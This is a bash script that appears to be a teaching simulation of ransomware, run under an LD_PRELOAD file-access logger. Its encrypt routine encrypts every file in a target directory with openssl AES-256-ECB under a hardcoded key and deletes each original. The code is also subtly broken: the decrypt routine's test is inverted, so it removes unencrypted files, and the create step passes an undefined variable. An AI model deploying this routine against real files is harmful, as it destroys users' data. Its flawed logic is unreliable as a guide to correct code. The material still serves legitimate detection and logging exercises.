#!/bin/bash

let num=0
directory=""

function usage(){
    printf "***********************************************************************************\n"
    printf "Usage:\n"
    printf -- "-n  The number of files to be created for the simulation of the ransomware\n"
    printf -- "-p  The path of the directory that ransomware targets\n"
    printf -- "-e  Encrypt EVERYTHING under that directory\n"
    printf -- "-d  Decrypt encrypted files under that directory\n"
    printf -- "-h  This help message\n"
    printf "***********************************************************************************\n"
    printf "How to run this program:\n"
    printf "./ransomware.sh -p <dir> -n N  --> for file creation\n"
    printf "./ransomware.sh -e <dir>       --> for file encryption\n"
    printf "./ransomware.sh -d <dir>       --> for file decryption\n"
    printf "***********************************************************************************\n"

    exit 0
}

function create(){
    LD_PRELOAD=./logger.so ./bash_help "$direct" "$num" 
    exit 0
}

function encrypt(){
  for i in $directory/* 
  do 
    if [[ "$i" != *".encrypt"* ]] && [[ "$i" != *".junk"* ]]; then 
        LD_PRELOAD=./logger.so openssl enc -aes-256-ecb -e -pbkdf2 -salt -in $i -out $i.encrypt -k 1234
        rm $i
    fi
  done
  exit 0
}

function decrypt(){
  for i in $directory/* 
  do 
    if [[ "$i" != *".encrypt"* ]]; then
        filename="${i%.*}" 
        LD_PRELOAD=./logger.so openssl aes-256-ecb -pbkdf2 -salt -in $i -out $filename -d -k 1234
        rm $i
    fi
  done
  exit 0
}

if [[ $# -eq 0 ]]; then
    usage
fi

while [[ ! -z "$1" ]]; do   # while 1st arg not Null

    if [[ "$1" == "-p" ]]; then
        directory="$2"
        shift
    elif [[ "$1" == "-n" ]]; then
        num="$2"
        shift
    elif [[ "$1" == "-e" ]]; then
        directory="$2"
        encrypt
    elif [[ "$1" == "-d" ]]; then
        directory="$2"
        decrypt
    elif [[ "$1" == "-h" ]]; then
        usage
    fi
    shift
done

if  [[ "$directory" == "" ]] || [[ $num -lt 1 ]]; then
    usage
fi

create